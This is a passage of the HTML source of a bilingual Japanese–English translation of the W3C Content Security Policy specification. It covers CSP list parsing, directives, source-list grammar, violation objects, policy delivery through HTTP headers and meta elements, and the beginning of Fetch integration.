Let directive be a new directive whose name is directive name, and value is directive value.
◎
Add directive to policy’s directive set.
</li>
		</ol>
	</li>
	<li>
~RET 次のようにされた，新たな`施策$
⇒
`指令~集合$ ~SET %指令~集合,<br>
`処分先$ ~SET %処分先
◎
Return policy.
</li>
</ol>



			</section>
			<section id="parse-serialized-policy-list">
<h4 title="Parse a serialized CSP list as disposition">2.1.2. 直列化形の %~CSP~listを %処分先 向けに構文解析する</h4>

<p>
次の~algoは、所与の
( 一連の`直列化形の~CSP$文字列からなる~comma区切りの文字列 %~list, `処分先$ %処分先 )
に対し，`施策$~objの~listを返す：
◎
Given a string (list) and a disposition (disposition) which contains a comma-delimited series of serialized CSP strings, the following algorithm will return a list of policy objects:
</p>

<ol>
	<li>
`施策たち^v ~LET 空~list
◎
Let policies be an empty list.
</li>
	<li>
<p>
~FOR ［
%~list を`~commaで分割-$した結果
］内の ~EACH ( %~token ) に対し：
◎
For each token returned by splitting list on commas:
</p>
		<ol>
			<li>
%施策 ~LET［
( %~token, %処分先 )
を入力に，`直列化形の~CSPとして構文解析-$Aした結果
］
◎
Let policy be the result of executing §2.1.1 Parse a serialized CSP as disposition on token with disposition.
</li>
			<li>
~IF［
%施策 の`指令~集合$は空である
］
⇒
~CONTINUE
◎
If policy’s directive set is empty, skip the remaining substeps, and continue to the next item.
</li>
			<li>
%施策 を `施策たち^v に追加する
◎
Add policy to policies.
</li>
		</ol>
	</li>
	<li>
~RET `施策たち^v
◎
Return policies.
</li>
</ol>



			</section>
		</section>
		<section id="framework-directives">
<h3 title="Directives">2.2. 指令</h3>

<p>
各`施策$は、いくつかの
`指令@
からなる集合を包含する
— そのそれぞれは、特定の挙動を制御する。
この文書にて定義される各種~指令の詳細は、
<a href="#csp-directives">~CSP指令</a>
節にて述べられる。
◎
Each policy contain a set of directives, each of which controls a specific behavior. The directives defined in this document are described in detail in §6 Content Security Policy Directives.
</p>

<p>
各 `指令$は［
`名前@,
`値@
］の~pairである。
`名前$は 空でない文字列であり，`値$は［
空でない文字列
］からなる集合である。
`値$は空~集合でも~MAY。
◎
Each directive is a name / value pair. The name is a non-empty string, and the value is a set of non-empty strings. The value set MAY be empty.
</p>

<p>
所与の
( `名前$ %名前, `値$ %値 )
からなる`指令$は，
`指令$( %名前, %値 )
とも記される。
</p>

<p>
`直列化形の指令@
は、次の`~ABNF$文法に従うような，空白~区切りの，一個以上の~tokenからなる ASCII 文字列である：
◎
A serialized directive is an ASCII string, consisting of one or more whitespace-delimited tokens, and adhering to the following ABNF [RFC5234]:
</p>

<pre class="ABNF">
`serialized-directive@p = `directive-name$p [ `RWS$P `directive-value$p ]
`directive-name@p       = 1*( `ALPHA$P / `DIGIT$P / "-" )
`directive-value@p      = *( `09^hex / `20^hex-`2B^hex / `2D^hex-`3A^hex / `3C^hex-`7E^hex )

; Directive values may contain whitespace and VCHAR characters,
; excluding ";" and ","
; RWS is defined in section 3.2.3 of RFC7230. ALPHA, DIGIT, and
; VCHAR are defined in Appendix B.1 of RFC 5234.
</pre>

<p>
指令~値（ `directive-value$p ）は、空白, および［
`;^l, `,^l
を除く `VCHAR$P
］を包含し得る。
</p>

<p>
各 `指令$には、【その種別ごとに】次の~algoが結付けられる：
◎
Directives have a number of associated algorithms:
</p>

<dl class="def-list">
	<dt>`要請前~検査@A</dt>
	<dd>
( `要請$, `施策$ )
を引数にとり，
`要請は~CSPにより阻止されるべきか？$A
の間に実行される。
他から指定されない限り†，この~algoは `許容ed^i を返す。
◎
A pre-request check, which takes a request and a policy as an argument, and is executed during §4.1.3 Should request be blocked by Content Security Policy?. This algorithm returns "Allowed" unless otherwise specified.
</dd>
	<dd class="trans-note">【†
当の指令に対し，特に~algoが定義されていない場合には。
以下同様。
】</dd>

	<dt>`要請後~検査@A</dt>
	<dd>
( `要請$, `応答$, `施策$ )
を引数にとり，
`要請に対する応答は~CSPにより阻止されるべきか？$A
の間に実行される。
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
A post-request check, which takes a request, a response, and a policy as arguments, and is executed during §4.1.4 Should response to request be blocked by Content Security Policy?. This algorithm returns "Allowed" unless otherwise specified.
</dd>

	<dt>`応答~検査@A</dt>
	<dd>
( `要請$, `応答$, `施策$ )
を引数にとり，
`要請に対する応答は~CSPにより阻止されるべきか？$A
の間に実行される。
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
A response check, which takes a request, a response, and a policy as arguments, and is executed during §4.1.4 Should response to request be blocked by Content Security Policy?. This algorithm returns "Allowed" unless otherwise specified.
</dd>

	<dt>`~inline検査@A</dt>
	<dd>
( `要素$, 型~文字列, ~source文字列 )
を引数にとり，
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
の間に実行される。
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
An inline check, which takes an Element a type string, and a soure string as arguments, and is executed during §4.2.3 Should element’s inline type behavior be blocked by Content Security Policy?. This algorithm returns "Allowed" unless otherwise specified.
</dd>

	<dt>`初期化@A</dt>
	<dd>
( ［
`文書$または `大域~obj$
］, `応答$ , `施策$ )
を引数にとり，
`文書の~CSP~listを初期化する$A間に実行される。
他から指定されない限り，この~algoは何もしない。
◎
An initialization, which takes a Document or global object, a response, and a policy as arguments. This algorithm is executed during §4.2.1 Initialize a Document's CSP list, and has no effect unless otherwise specified.
</dd>

	<dt>`~navi前~検査@A</dt>
	<dd>
( `要請$, 種別~文字列, `閲覧文脈$, `閲覧文脈$ )
を引数にとり，
<a href="#should-block-navigation-request">( %~navi要請 of %種別 from %~source in %~target ) は ~CSPにより阻止されるべきか？</a>
の間に実行される。
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
A pre-navigation check, which takes a request, type string, and two browsing contexts as arguments, and is executed during §4.2.4 Should navigation request of type from source in target be blocked by Content Security Policy?. It returns "Allowed" unless otherwise specified.
</dd>

	<dt>`~navi応答~検査@A</dt>
	<dd>
( `要請$, `応答$, `閲覧文脈$, `閲覧文脈$ )
を引数にとり，
<a href="#should-block-navigation-response">( %~navi要請 of %種別 from %~source in %~target ) に対する %~navi応答 は ~CSPにより阻止されるべきか？</a>
の間に実行される。
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
A navigation response check, which takes a request, a response and two browsing contexts as arguments, and is executed during §4.2.5 Should navigation response to navigation request of type from source in target be blocked by Content Security Policy?. It returns "Allowed" unless otherwise specified.
</dd>

</dl>



			<section id="framework-directive-source-list">
<h4 title="Source Lists">2.2.1. ~source~list</h4>

<p>
各種 `指令$のうち，多くのものは、
`~source~list@
（ `serialized-source-list$p ）をその`値$にとる。
各`~source~list$は、~tokenの集合である
— その各~tokenは、［
~fetchし得る内容であって［
埋込まれ得る／実行され得る
］もの
］を識別するような，次のいずれかの型の
`~source式@
（ `source-expression$p ）を表現する：
◎
Many directives' values consist of source lists: sets of tokens which identify content that can be fetched and potentially embedded or executed. These tokens represent one of the following types of source expression:
</p>


<ul>
	<li>
~keyword `none$pl （何にも合致しない）
◎
↓</li>
	<li>
他の~keyword（ `keyword-source$p ）
— 例えば
⇒
`self$pl （現在の~URLの生成元に合致する）
◎
Keywords such as 'none' and 'self' (which match nothing and the current URL’s origin, respectively)
</li>
	<li>
直列化形の~URL（ `scheme-part$p を伴う `host-source$p ）
— 例えば
⇒
`https://example.com/path/to/file.js^s
（特定の資源に合致する）や,
`https://example.com/^s
（その生成元に属する どの資源にも合致する）
◎
Serialized URLs such as https://example.com/path/to/file.js (which matches a specific file) or https://example.com/ (which matches everything on that origin)
</li>
	<li>
~scheme（ `scheme-source$p ）は、指定された~schemeを持つ どの資源にも合致する
— 例えば
⇒
`https:^s
◎
Schemes such as https: (which matches any resource having the specified scheme)
</li>
	<li>
~host（ `scheme-part$p を伴わない `host-source$p ）
— 例えば
⇒
`example.com^s （~schemeに関わらず，その~host上の どの資源にも合致する）や,
`*.example.com^s （その［
~host, および その下位domain（下位domainの下位domain, 等々も含む）
］上の どの資源にも合致する）

◎
Hosts such as example.com (which matches any resource on the host, regardless of scheme) or *.example.com (which matches any resource on the host or any of its subdomains (and any of its subdomains' subdomains, and so on))
</li>
	<li>
~nonce（ `nonce-source$p ）は、~page上の特定の要素に合致し得る
— 例えば
⇒
`nonce-qwertyu12345^pl
◎
Nonces such as 'nonce-qwertyu12345' (which can match specific elements on a page)
</li>
	<li>
~digest（ `hash-source$p ）は、~page上の特定の要素に合致し得る
— 例えば
⇒
`sha256-abcd...^pl などの，
◎
Digests such as 'sha256-abcd...' (which can match specific elements on a page)
</li>
</ul>

<p>
`直列化形の~source~list@
（ `serialized-source-list$p ）
は、次の`~ABNF$文法に従うような，~space区切りの，一連の`~source式$からなる ASCII 文字列である：
◎
A serialized source list is an ASCII string, consisting of a space-delimited series of source expressions, adhering to the following ABNF grammar [RFC5234]:
</p>

<pre class="ABNF">
`serialized-source-list@p
                  = ( `source-expression$p *( `RWS$P `source-expression$p ) )
                  / "`none@pl"

`source-expression@p = `scheme-source$p
                  / `host-source$p
                  / `keyword-source$p
                  / `nonce-source$p
                  / `hash-source$p

; <span class="comment">~scheme ~source式：</span>
;          `https:^l
;        / `custom-scheme:^l
;        / `another.custom-scheme:^l
`scheme-source@p     = `scheme-part$p ":"

; <span class="comment">~host ~source式：</span>
;          `example.com^s
;        / `*.example.com^s
;        / `https://*.example.com:12/path/to/file.js^s
`host-source@p       = [ `scheme-part$p "://" ]
                    `host-part$p
                    [ `port-part$p ]
                    [ `path-part$p ]
`scheme-part@p       = `scheme$p
                  ; scheme is defined in section 3.1 of RFC 3986.
`host-part@p         = "*"
                  / [ "*." ] 1*`host-char$p *( "." 1*`host-char$p )
`host-char@p         = `ALPHA$P / `DIGIT$P / "-"
`port-part@p         = ":" ( 1*`DIGIT$P / "*" )
`path-part@p         = `path-abempty$p
                  ; path-abempty is defined in section 3.3 of RFC 3986.

; <span class="comment">~keyword ~source式：</span>
`keyword-source@p    = "`self@pl"
                  / "`unsafe-inline@pl"
                  / "`unsafe-eval@pl"
                  / "`strict-dynamic@pl"
                  / "`unsafe-hashed-attributes@pl"

; <span class="comment">~nonce ~source式：</span>
; `'nonce-[nonce goes here]'^s
`nonce-source@p      = "'nonce-" `base64-value$p "'"
`base64-value@p      = 1*( `ALPHA$P / `DIGIT$P / "+" / "/" / "-" / "_" )*2( "=" )

; <span class="comment">~digest ~source式：</span>
; `'sha256-[digest goes here]'^s
`hash-source@p       = "'" `hash-algorithm$p "-" `base64-value$p "'"
`hash-algorithm@p    = "sha256" / "sha384" / "sha512"
</pre>


<p>
`host-char$p 生成規則は、意図的に ASCII 文字のみを包含するようにされている。
国際化~domain名は，`直列化形の~CSP$の一部として直接的に手入力できないので、代わりに
Punycode `RFC3492$r で符号化され~MUST。
例えば，
~domain `üüüüüü.de^s
は、
`xn--tdaaaaaa.de^s
として表現され~MUST。
◎
The host-char production intentionally contains only ASCII characters; internationalized domain names cannot be entered directly as part of a serialized CSP, but instead MUST be Punycode-encoded [RFC3492]. For example, the domain üüüüüü.de MUST be represented as xn--tdaaaaaa.de.
</p>

<p class="note">注記：
IP ~addressは，上の文法に合致するが、~source式~内に利用されるときに 実際に合致する~URLは，
`127.0.0.1^s
のみである（詳細は
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A
を見よ）。
IP ~addressが備える保安上の特質には疑義があるので、可能0なら~hostnameが選好されるべきである。
◎
Note: Though IP address do match the grammar above, only 127.0.0.1 will actually match a URL when used in a source expression (see §6.6.1.5 Does url match source list in origin with redirect count? for details). The security properties of IP addresses are suspect, and authors ought to prefer hostnames whenever possible.
</p>


			</section>
		</section>
		<section id="framework-violation">
<h3 title="Violations">2.3. 違反</h3>

<p>
`違反@
は、`大域~obj$に結付けられている`施策$~objの集合に反した［
動作／資源
］を表現する。
◎
A violation represents an action or resource which goes against the set of policy objects associated with a global object.
</p>


<p>
各 `違反$は、次のものを持つ：
◎
↓</p>

<dl class="def-list">

	<dt>`大域~obj@vr</dt>
	<dd>
違反された`施策$を持つ`大域~obj$
◎
Each violation has a global object, which is the global object whose policy has been violated.
</dd>

	<dt>`~url@vr</dt>
	<dd>
この違反の`大域~obj$vrの`~URL$
◎
Each violation has a url which is its global object’s URL.
</dd>

	<dt>`状態code@vr</dt>
	<dd>
［
大域~objを~instance化させた資源
］の~HTTP状態codeを表現する，非負~整数
◎
Each violation has a status which is a non-negative integer representing the HTTP status code of the resource for which the global object was instantiated.
</dd>

	<dt>`資源@vr</dt>
	<dd>
施策に違反した資源を表現する
— 次のいずれか
⇒
`null^l ／ `inline^l ／ `eval^l ／ `~URL$
◎
Each violation has a resource, which is either null, "inline", "eval", or a URL. It represents the resource which violated the policy.
</dd>

	<dt>`~referrer@vr</dt>
	<dd>
施策に違反した資源の~referrerを表現する
— 次のいずれか
⇒
~NULL ／ `~URL$
◎
Each violation has a referrer, which is either null, or a URL. It represents the referrer of the resource whose policy was violated.
</dd>

	<dt>`施策@vr</dt>
	<dd>
違反された`施策$。
◎
Each violation has a policy, which is the policy that has been violated.
</dd>

	<dt>`有効な指令@vr</dt>
	<dd>
［
施行により この違反を生じさせた，`施策$vr内の`指令$
］を表現する，空でない文字列。
◎
Each violation has an effective directive which is a non-empty string representing the directive whose enforcement caused the violation.
</dd>

	<dt>`処分先@vr</dt>
	<dd>
違反された施策の`処分先$。
◎
Each violation has a disposition, which is the disposition of the policy that has been violated.
</dd>

	<dt>`~source~file@vr</dt>
	<dd>
次のいずれか
⇒
~NULL ／ `~URL$
◎
Each violation has a source file, which is either null or a URL.
</dd>

	<dt>`行番号@vr</dt>
	<dd>
非負~整数。
◎
Each violation has a line number, which is a non-negative integer.
</dd>

	<dt>`列番号@vr</dt>
	<dd>
非負~整数。
◎
Each violation has a column number, which is a non-negative integer.
</dd>

	<dt>`要素@vr</dt>
	<dd>
~NULL または要素。
◎
Each violation has a element, which is either null or an element.
</dd>
</dl>


			<section id="create-violation-for-global">
<h4 title="Create a violation object for global, policy, and directive">2.3.1. ( %大域~obj, %施策, %指令~名 ) から違反~objを作成する</h4>

<p>
次の~algoは、新たな`違反$~objを，所与の
( `大域~obj$ %大域~obj, `施策$ %施策, 文字列 %指令~名 )
から作成して、それを初期~dataの集合で拡充する：
◎
Given a global object (global), a policy (policy), and a string (directive), the following algorithm creates a new violation object, and populates it with an initial set of data:
</p>

<ol>
	<li>
%違反 ~LET 次のようにされた新たな `違反$
⇒
`大域~obj$vr ~SET %大域~obj,<br>
`施策$vr ~SET %施策,<br>
`有効な指令$vr ~SET %指令~名,<br>
`資源$vr ~SET `null^l
◎
Let violation be a new violation whose global object is global, policy is policy, effective directive is directive, and resource is null.
</li>
	<li>
<p>
~IF［
~UAは，現在~scriptを実行している
］~AND［
%大域~obj から ~scriptの~source~fileの
( ~URL, 行番号, 列番号 )
を抽出できる
］
⇒
%違反 の
( `~source~file$vr, `行番号$vr, `列番号$vr )
~SET それら
◎
If the user agent is currently executing script, and can extract a source file’s URL, line number, and column number from the global, set violation’s source file, line number, and column number accordingly.
</p>

<p class="issue">
この種のものは，どこかで指定されているのか？
`ECMA262$r には，有用な~~記述は見当たらない。
◎
Is this kind of thing specified anywhere? I didn’t see anything that looked useful in [ECMA262].
</p>

	</li>
	<li>
~IF［
%大域~obj は `Window$I ~objである
］
⇒
%違反 の`~referrer$vr ~SET
%大域~obj の `document$m の
<a href="~HTMLdom#dom-document-referrer">`referrer^m</a>
◎
If global is a Window object, set violation’s referrer to global’s document's referrer.
</li>
	<li>
<p>
%違反 の`状態code$vr ~SET
%違反 の`大域~obj$vrに結付けられている資源の~HTTP状態code
◎
Set violation’s status to the HTTP status code for the resource associated with violation’s global object.
</p>

<p class="issue">
状態codeは，正確にはどうやって取得する？
— 実際には どこにも格納されていない。
◎
How, exactly, do we get the status code? We don’t actually store it anywhere.
</p>
	</li>
	<li>
~RET %違反
◎
Return violation.
</li>
</ol>



			</section>
			<section id="create-violation-for-request">
<h4 title="Create a violation object for request, policy, and directive">2.3.2. ( %要請, %施策, %指令~名 ) から 違反~objを作成する</h4>

<p>
次の~algoは、新たな`違反$~objを，所与の
( `要請$ %要請, `施策$ %施策, 文字列 %指令~名 )
から作成して、それを 初期~dataの集合で拡充する：
◎
Given a request (request), a policy (policy), and a string (directive), the following algorithm creates a new violation object, and populates it with an initial set of data:
</p>

<ol>
	<li>
%違反 ~LET `新たな違反~obj$A1(
%要請 の`~client$rqの`大域~obj$x %施策, %指令~名
)
◎
Let violation be the result of executing §2.3.1 Create a violation object for global, policy, and directive on request’s client’s global object, policy, and directive.
</li>
	<li>
<p>
%違反 の`資源$vr ~SET %要請 の`~url$rq
◎
Set violation’s resource to request’s url.
</p>

<p class="note">注記：
ここでは
%要請 の`~url$rqを利用する
— 
その`現在の~url$rq<em >ではなく</em>
—
後者は、［
~pageから~accessされては~MUST_NOTような，~redirect~target
］についての情報を包含することもあるので。
◎
Note: We use request’s url, and not its current url, as the latter might contain information about redirect targets to which the page MUST NOT be given access.
</p>
	</li>
	<li>
~RET %違反
◎
Return violation.
</li>
</ol>

			</section>
		</section>
	</section>
	<section id="policy-delivery">
<h2 title="Policy Delivery">3. 施策の送達</h2>

<p>
~serverは、個々の`資源~表現$に対し，`施策$を宣言して~MAY
— `施策$を`直列化-$した上で，~HTTP応答~headerの値に与えることにより。
この仕組みは、［
<a href="#csp-header">`Content-Security-Policy^h</a> ／
<a href="#cspro-header">`Content-Security-Policy-Report-Only^h</a>
］HTTP 応答~header節にて詳細に定義される。
また、［
`~Fetchとの統合$ ／ `~HTMLとの統合$
］節にて［
~Fetch ／ ~HTML
］との統合が述べられる。
◎
A server MAY declare a policy for a particular resource representation via an HTTP response header field whose value is a serialized CSP. This mechanism is defined in detail in §3.1 The Content-Security-Policy HTTP Response Header Field and §3.2 The Content-Security-Policy-Report-Only HTTP Response Header Field, and the integration with Fetch and HTML is described in §4.1 Integration with Fetch and §4.2 Integration with HTML.
</p>

<p>
`施策$は、
<a href="#meta-element">`meta^e 要素</a>
節に述べるように，［
`meta$e 要素の `http-equiv$a 属性を介して ~HTML文書~内に~inlineに宣言する
］こともできる。
◎
A policy may also be declared inline in an HTML document via a meta element’s http-equiv attribute, as described in §3.3 The &lt;meta&gt; element.
</p>


		<section id="csp-header">
<h3 title="The Content-Security-Policy HTTP Response Header Field">3.1. `Content-Security-Policy^h HTTP 応答~header</h3>

<p>
`Content-Security-Policy@h
~HTTP応答~headerが、~serverから~clientへ施策を送達するときに選好される仕組みである。
この~headerの値は、次の`~ABNF$で表現される：
◎
The Content-Security-Policy HTTP response header field is the preferred mechanism for delivering a policy from a server to a client. The header’s value is represented by the following ABNF [RFC5234]:
</p>


<pre class="ABNF">
Content-Security-Policy = 1#`serialized-policy$p
</pre>

<div class="example">

<pre class="http-code">
`Content-Security-Policy$h:
    `script-src$dir `self$pl;
    `report-to$dir csp-reporting-endpoint
</pre>
</div>

<p>
~serverは、同じ資源の異なる`表現$ごとに，異なる
`Content-Security-Policy^h ~header値を送信して~MAY。
◎
A server MAY send different Content-Security-Policy header field values with different representations of the same resource.
</p>

<p>
~serverは、`資源~表現$を送信する際に，複数の
`Content-Security-Policy^h ~headerを伴わせる~SHOULDでない。
◎
A server SHOULD NOT send more than one HTTP response header field named "Content-Security-Policy" with a given resource representation.
</p>

<p>
`Content-Security-Policy^h ~headerを受信した~UAは、それが包含する各 `直列化形の~CSP$を`構文解析-$Aした上で，［
`~Fetchとの統合$ ／ `~HTMLとの統合$
］節にしたがって それを`施行-$し~MUST。
◎
When the user agent receives a Content-Security-Policy header field, it MUST parse and enforce each serialized CSP it contains as described in §4.1 Integration with Fetch, §4.2 Integration with HTML.
</p>



		</section>
		<section id="cspro-header">
<h3 title="The Content-Security-Policy-Report-Only HTTP Response Header Field">3.2. `Content-Security-Policy-Report-Only^h HTTP 応答~header</h3>

<p>
`Content-Security-Policy-Report-Only@h
~HTTP応答~headerは、~web開発者が，施策による効果を（~~実際に施行することなく）監視して，実験できるようにする。
この~headerの値は、次の`~ABNF$ で表現される：
◎
The Content-Security-Policy-Report-Only HTTP response header field allows web developers to experiment with policies by monitoring (but not enforcing) their effects. The header’s value is represented by the following ABNF [RFC5234]:
</p>

<pre class="ABNF">
Content-Security-Policy-Report-Only = 1#`serialized-policy$p
</pre>

<p>
この~headerにより、~web開発者は，自身の手による保安~施策を，すでに施行-中のものと同時に，報告のみ行わせて、反復的に開発することが可能になる
— その違反~報告から得られる，~siteの挙動についての最善の評価0に基づいて、挙動が適切であると判断がついた時点で，施策を施行-へ移すことにより。
◎
This header field allows developers to piece together their security policy in an iterative fashion, deploying a report-only policy based on their best estimate of how their site behaves, watching for violation reports, and then moving to an enforced policy once they’ve gained confidence in that behavior.
</p>

<div class="example">

<pre class="http-code">
`Content-Security-Policy-Report-Only$h:
    `script-src$dir `self$pl;
    `report-to$dir csp-reporting-endpoint
</pre>
</div>

<p>
~serverは、同じ資源の異なる`表現$ごとに，異なる
`Content-Security-Policy-Report-Only^h ~header値を送信して~MAY。
◎
A server MAY send different Content-Security-Policy-Report-Only header field values with different representations of the same resource.
</p>

<p>
~serverは、`資源~表現$を送信する際に，複数の［
`Content-Security-Policy-Report-Only^h ~header
］を伴わせる~SHOULDでない。
◎
A server SHOULD NOT send more than one HTTP response header field named "Content-Security-Policy-Report-Only" with a given resource representation.
</p>

<p>
`Content-Security-Policy-Report-Only^h ~headerを受信した~UAは、それが包含する各 `直列化形の~CSP$を`構文解析-$Aした上で，［
`~Fetchとの統合$ ／ `~HTMLとの統合$
］節にしたがって，それを`監視-$し~MUST。
◎
When the user agent receives a Content-Security-Policy-Report-Only header field, it MUST parse and monitor each serialized CSP it contains as described in §4.1 Integration with Fetch and §4.2 Integration with HTML.
</p>

<p class="note">注記：
`Content-Security-Policy-Report-Only^h 
~headerは、
`meta$e 要素の内側では~support<strong>されない</strong>。
◎
Note: The Content-Security-Policy-Report-Only header is not supported inside a meta element.
</p>



		</section>
		<section id="meta-element">
<h3 title="The &lt;meta&gt; element">3.3. `meta^e 要素</h3>

<p>
`文書$は、いくつかの［
~HTML `meta$e 要素であって, ［
その `http-equiv$a 属性~値 ~EQ~ACI `Content-Security-Policy^l
］なるもの
］を介して，施策を送達することもできる<!-- may -->。
例えば：
◎
A Document may deliver a policy via one or more HTML meta elements whose http-equiv attributes are an ASCII case-insensitive match for the string "Content-Security-Policy". For example:
</p>

<div class="example">

<pre class="html-code">
&lt;meta
  http-equiv="Content-Security-Policy"
  content="script-src `self$pl"
&gt;
</pre>
</div>

<p>
実装の詳細は~HTMLの
`~CSP状態 http-equiv 処理命令$ `HTML$r
にて見出せる。
◎
Implementation details can be found in HTML’s Content Security Policy state http-equiv processing instructions [HTML].
</p>

<p class="note">注記：
`Content-Security-Policy-Report-Only^h ~headerは、
`meta$e 要素の内側では~support<strong>されない</strong>
— ［
`report-uri$dir,
`frame-ancestors^dir,
`sandbox^dir
］指令も含め。
◎
Note: The Content-Security-Policy-Report-Only header is not supported inside a meta element. Neither are the report-uri, frame-ancestors, and sandbox directives.
</p>

<p>
`meta$e 要素~内の施策は、それに先行する内容には適用されない。
したがって，作者には、［
`meta$e 要素を 可能0な限り文書の始めの方に配置する
］ことが<em>強く奨励される</em>。
特に、［
`Link$h HTTP 応答~header ／
施策を送達する `meta$e に先行する［
`link$e ／ `script$e
］要素
］を利用して，~fetchあるいは事前fetchされる資源は、阻止されないことに注意。
◎
Authors are strongly encouraged to place meta elements as early in the document as possible, because policies in meta elements are not applied to content which precedes them. In particular, note that resources fetched or prefetched using the Link HTTP response header field, and resources fetched or prefetched using link and script elements which precede a meta-delivered policy will not be blocked.
</p>

<p class="note">注記：
`meta$e 要素を介して指定される`施策$は、被保護~資源にて作動中の他の施策とともに
— 他の施策がどこで指定されたかに関わらず —
施行される。
複数の施策が施行されるときの一般的な影響0は、
<a href="#multiple-policies">複数の施策による効果</a>
節にて述べる。
◎
Note: A policy specified via a meta element will be enforced along with any other policies active for the protected resource, regardless of where they’re specified. The general impact of enforcing multiple policies is described in §8.1 The effect of multiple policies.
</p>

<p class="note">注記：
要素が構文解析された後に，
`meta$e 要素の `content$a 属性を改変しても、無視される。
◎
Note: Modifications to the content attribute of a meta element after the element has been parsed will be ignored.
</p>

		</section>
	</section>
	<section id="integrations">
<h2 title="Integrations">4. 他の仕様との統合</h2>

~INFORMATIVE

<p>
この文書は、~CSPの機能性を実装するために，他の仕様から利用される~algoの集合を定義する。
明確さのため、これらの統合は，ここで概説されるが、詳細な情報への規範的な参照は，それらの外部~文書にあたるべきである。
◎
This document defines a set of algorithms which are used in other specifications in order to implement the functionality. These integrations are outlined here for clarity, but those external documents are the normative references which ought to be consulted for detailed information.
</p>



		<section id="fetch-integration">
<h3 title="Integration with Fetch">4.1. ~Fetchとの統合</h3>

<p>
`指令$のうち一部は、何らかの仕方で，資源の読込みを制御する。
この仕様は、 `FETCH$r にて［
特定0の`要請$を阻止するべきか許容するべきか ／
特定0の`応答$を`~network~error$に置換するべきかどうか
］についての~~決定を下すときに利用される，いくつかの~algoを提供する。
◎
A number of directives control resource loading in one way or another. This specification provides algorithms which allow Fetch to make decisions about whether or not a particular request should be blocked or allowed, and about whether a particular response should be replaced with a network error.
</p>

<ol>
	<li>
`要請は~CSPにより阻止されるべきか？$Aは、`~main~fetch$~algoの中<!-- step #5 -->から~callされる。
◎
§4.1.3 Should request be blocked by Content Security Policy? is called as part of step #5 of its Main Fetch algorithm.
</li>
	<li>
<p>
`要請に対する応答は~CSPにより阻止されるべきか？$Aは、`~main~fetch$~algoの中<!-- step #13 -->から~callされる
◎
§4.1.4 Should response to request be blocked by Content Security Policy? is called as part of step #13 of its Main Fetch algorithm.
</p>
	</li>
</ol>

<p>
`施策$は，一般に `大域~obj$に対し施行されるが、［
`応答$の詳細についての知識も要求する指令
］を取扱うため、~UAは，［
~HTTP応答~headerを介して送達される どの施策も，`大域~obj$が作成される前に`構文解析-$Aする
］必要がある。
よって：
◎
A policy is generally enforced upon a global object, but the user agent needs to parse any policy delivered via an HTTP response header field before any global object is created in order to handle directives that require knowledge of a response’s details. To that end:
</p>

<ol>
	<li>
`応答$には、`~CSP~list$rsが結付けられる
— この~listは、`応答$の`~header~list$rs内に送達される施策~objたちを包含する。
◎
A response has an associated CSP list which contains any policy objects delivered in the response’s header list.
</li>
	<li>
<p>
`応答の~CSP~listを設定する$A手続きが，［
`~HTTP~fetch$ ／ `~HTTP-network~fetch$
］~algoの中から~callされる
◎
§4.1.1 Set response’s CSP list is called in the HTTP fetch and HTTP-network fetch algorithms.
</p>

<p class="note">注記：
`応答$がどう作成されたかに関わらず、これら二つの~callにより，`応答$の`~CSP~list$rsは必ず設定されるようにするべきである。
~networkを（ `~HTTP-network~fetch$を介して）叩いたのなら、応答に伴われる施策を， `Set-Cookie^h ~headerを取扱う前に構文解析することになる。
応答を（`~HTTP~fetch$を介して） Service Worker から取得したのなら、応答を呼び出し元に~~渡し~~返す前に，その`~CSP~list$rsを処理することになる。
◎
Note: These two calls should ensure that a response’s CSP list is set, regardless of how the response is created. If we hit the network (via HTTP-network fetch, then we parse the policy before we handle the Set-Cookie header. If we get a response from a Service Worker (via HTTP fetch, we’ll process its CSP list before handing the response back to our caller.
</p>
	</li>
</ol>



			<section id="set-response-csp-list">
<h4 title="Set response’s CSP list">4.1.1. %応答 の~CSP~listを設定する</h4>

<p>
次の~algoは、所与の
( `応答$ %応答 )
に対し，［
その`~header~list$rsを，一連の`直列化形の~CSP$値として評価した結果
］に基づいて， %応答 の`~CSP~list$rsを拡充する：
◎
Given a response (response), this algorithm evaluates its header list for serialized CSP values, and populates its CSP list accordingly:
</p>


<ol>
	<li>
%応答 の`~CSP~list$rs ~SET 空~list
◎
Set response’s CSP list to the empty list.
</li>
	<li>
%~header値 ~LET %応答 の`~header~list$rs内で，名前
`Content-Security-Policy^h 
に対する`~header値を構文解析-$Aした結果
◎
↓</li>
	<li>
`施策たち^v ~LET［
( %~header値, `enforce^l )
を入力に，`直列化形の~CSP~listとして構文解析-$Aした結果
］
◎
Let policies be the result of executing §2.1.2 Parse a serialized CSP list as disposition on the result of parsing Content-Security-Policy in response’s header list, with a disposition of "enforce".
</li>
	<li>
%~header値 ~LET %応答 の`~header~list$rs内で，名前
`Content-Security-Policy-Report-Only^h
に対する`~header値を構文解析-$Aした結果
◎
↓</li>
	<li>
`施策たち^v に［
( %~header値, `report^l )
を入力に，`直列化形の~CSP~listとして構文解析-$Aした結果
］を付加する
◎
Append to policies the result of executing §2.1.2 Parse a serialized CSP list as disposition on the result of parsing Content-Security-Policy-Report-Only in response’s header list, with a disposition of "report".
</li>
	<li>
<p>
~FOR
`施策たち^v 内の ~EACH ( %施策 ) に対し：
◎
For each policy in policies:
</p>
		<ol>
			<li>
%施策 を %応答 の`~CSP~list$rsの中に挿入する
◎
Insert policy into response’s CSP list.
</li>
		</ol>
	</li>
</ol>



			</section>
			<section id="report-for-request">
<h4 title="Report Content Security Policy violations for request">4.1.2.  %要請 に対する~CSP違反を報告する</h4>

<p>
次の~algoは、所与の
( `要請$ %要請 )
に対し，
`~client$rqの “報告のみ” の施策に基づいて違反を報告する：
◎
Given a request (request), this algorithm reports violations based on client’s "report only" policies.
</p>

<ol>
	<li>
%~CSP~list ~LET
%要請 の`~client$rqの`大域~obj$xの`~CSP~list$
◎
Let CSP list be request’s client’s global object’s CSP list.
</li>
	<li>
<p>
~FOR
%~CSP~list 内の ~EACH ( %施策 ) に対し：
◎
For each policy in CSP list:
</p>
		<ol>
			<li>
~IF［
%施策 の`処分先$ ~EQ `enforce^l
］
⇒
~CONTINUE
◎
If policy’s disposition is "enforce", then skip to the next policy.
</li>
			<li>
%違反ed指令 ~LET 
`要請は施策に違反するか？$A( %要請, %施策 )
◎
